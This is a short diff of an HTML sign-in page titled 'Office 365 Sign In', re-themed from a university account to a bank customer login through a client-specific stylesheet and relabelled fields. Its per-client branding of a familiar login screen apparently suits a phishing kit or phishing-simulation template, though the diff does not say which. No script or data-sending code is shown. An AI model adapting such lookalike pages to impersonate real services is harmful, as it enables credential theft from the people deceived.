@@ -7,28 +7,29 @@
   <title>Office 365 Sign In</title>
   <link rel="stylesheet" href="../../assets/css/style.css" />
   <link rel="stylesheet" href="../../assets/css/portal.css" />
+  <link rel="stylesheet" href="../../assets/css/bank-theme.css" />
 </head>
 
-<body class="portal-bg office-login-page">
+<body class="portal-bg office-login-page" data-client="bank">
   <main class="office-single-card">
     <div class="office-single-header">
       <div class="office-single-brand">
         <div class="office-single-mark">U</div>
         <div>
           <h1 class="office-single-title">Sign in</h1>
-          <p class="office-single-subtitle">Use your university account</p>
+          <p class="office-single-subtitle">Access your banking account</p>
         </div>
       </div>
     </div>
 
     <form id="portalLoginForm" class="office-single-form">
       <div class="office-single-field">
-        <label class="office-single-label" for="username">University Email / Username</label>
+        <label class="office-single-label" for="username">Customer ID / Username</label>
         <input
           type="text"
           id="username"
           class="office-single-input"
-          placeholder="Enter your university email or username"
+          placeholder="Enter your customer ID or username"
           required
         />
       </div>
